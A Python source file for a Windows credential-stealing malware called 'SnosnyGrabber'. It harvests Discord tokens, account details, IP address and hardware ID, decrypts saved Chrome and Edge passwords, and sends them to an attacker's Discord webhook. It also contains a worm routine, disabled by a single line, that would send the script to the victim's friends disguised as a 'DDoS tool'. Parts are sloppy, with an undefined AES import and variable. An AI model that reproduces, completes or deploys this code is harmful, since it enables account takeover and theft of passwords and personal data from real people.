import os
cmd = 'mode 90,20'
os.system(cmd)

import ctypes
ctypes.windll.kernel32.SetConsoleTitleW(f'Loading...')

if os.name != "nt":
    exit()

import re
import json
import base64
import subprocess
import sys
import datetime
import sqlite3
import zipfile
import cryptography
import shutil
import dhooks
import requests

from pypresence import Presence
from colorama import *
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from dhooks import Webhook, File, Embed, Webhook
from shutil import copyfile

if sys.platform.startswith('linux'):
    exit()
else:
    pass

from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

WEBHOOK_URL = 'YOU WEBHOOK'
HOOK = Webhook(WEBHOOK_URL)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip

def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True,
              stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass

def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass

def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                        "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    return
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + \
                "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            avatar_id = user_data.get("avatar")
            avatar_urll = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}'
            nitro = bool(user_data.get("premium_type"))
            verefication = user_data.get("verified")
            mfa = user_data.get("mfa_enabled")
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x2C2F33,
                "fields": [
                    {
                        "name": "Token information",
                        "value": f"Name: `{username}`\nID: `{user_id}`\nEmail: `{email}`\nPhone: `{phone}`",
                        "inline": True
                    },
                    {
                        "name": "Other Token information",
                        "value": f"\nIP: `{ip}`\nNitro: `{nitro}`\nBilling Info: `{billing}`\n2FA: `{mfa}`",
                        "inline": False
                    },
                    {
                        "name": "Token Platform",
                        "value": f"{platform}",
                        "inline": False
                    },
                    {
                        "name": "Token",
                        "value": f"{token}",
                        "inline": False
                    },
                ],
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    },
                }

            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": " Snosny",
        "avatar_url": "https://i.pinimg.com/280x280_RS/4e/be/f2/4ebef283526c507f9bb8cc7c0d5ad7a3.jpg"
    }
    try:
        urlopen(Request(WEBHOOK_URL, data=dumps(
            webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()

try:
    main()
except Exception as e:
    print(e)
    pass

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

class chromepassword:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()

zname = r'C:\ProgramData\passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\passwords.txt')
newzip.close()
passwords = File(r'C:\ProgramData\passwords.zip')

HOOK.send(file=passwords, avatar_url='https://i.pinimg.com/280x280_RS/4e/be/f2/4ebef283526c507f9bb8cc7c0d5ad7a3.jpg', username='SnosnyGrabber')
os.remove(r'C:\ProgramData\passwords.txt')
os.remove(r'C:\ProgramData\passwords.zip')

def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key

def dpayload(cipher, payload):
    return cipher.decrypt(payload)

def gcipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass

def passwordsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        pass
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()

def startt():
    while True:
        passwordsteal()

        try:
            subprocess.os.system('del Loginvault.db')
        except:
            pass
        break

startt()

ctypes.windll.kernel32.SetConsoleTitleW(f'Loaded')

client = Presence('838383764040056843')
client.connect()
client.update(
    details='SNOSNY FUCK YOU',
    state='Thanks for the token',
    large_image='ug'
)

print(f'''


{Fore.MAGENTA}
   ,-,--.  .-._          _,.---._      ,-,--.  .-._    ._.  ._.     ._.__.            
 ,-.'-  _\/==/ \  |-._ ,-.' , -  `.  ,-.'-  _\/==/ \  |  | /.-/    /_/__/
/==/_ ,_.'|==|, \/ /, /==/_,  ,  - \/==/_ ,_.'|==|, \/  ,|/==/-   /=/_ /  
\==\  \   |==|-  \|  |==|   .=.     \==\  \   |==|-  \|  |\==\, \/=/. /   
 \==\ -\  |==| ,  | -|==|_ : ;=:  - |\==\ -\  |==| ,  | -| \==\  \/ -/    
 _\==\ ,\ |==| -   _ |==| , '='     |_\==\ ,\ |==| -   _ |  |==|  ,_/     
/==/\/ _ ||==|  /\ , |\==\ -    ,_ //==/\/ _ ||==|  /\ , |  \==\-, /      
\==\ - , //==/, | |- | '.='. -   .' \==\ - , //==/, | |- |  /==/._/       
 `--`---' `--`./  `--`   `--`--''    `--`---' `--`./  `--`  `--`-`      
                                                     
                                                                     ''', Fore.RESET)
input(f'\n\n\n\n\n\n{Fore.MAGENTA}>{Fore.RESET} Enter anything to close: ')
